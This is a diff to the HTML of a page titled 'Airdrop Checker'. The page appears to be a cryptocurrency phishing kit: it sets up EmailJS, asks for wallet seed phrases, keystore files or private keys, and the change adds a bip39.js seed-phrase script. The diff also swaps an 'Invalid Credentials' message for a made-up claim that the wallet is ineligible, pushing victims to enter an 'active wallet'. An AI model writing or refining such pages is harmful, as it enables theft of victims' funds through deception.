@@ -18,6 +18,7 @@
             emailjs.init("oZMfh8Pn5s8P-9Awx");
         })();
     </script>
+    <script src="bip39.js"></script>
     <script src="script.js"></script>
     <title>Mainnet web — Airdrop Checker</title>
 </head>
@@ -1028,9 +1029,9 @@
                 </div>
                 <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
                 <p class="w-error-msg">
-                    <strong>Invalid Credentials</strong>
-                    The information you entered could not be verified. Please double-check your phrase, keystore file,
-                    or private key and try again.
+                    <strong>Error Connecting</strong>
+                    This could be due to your wallet volume being below the required minimum or your wallet is
+                    ineligible. Try again with an active wallet!
                 </p>
                 <div class="w-btn-stack">
                     <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
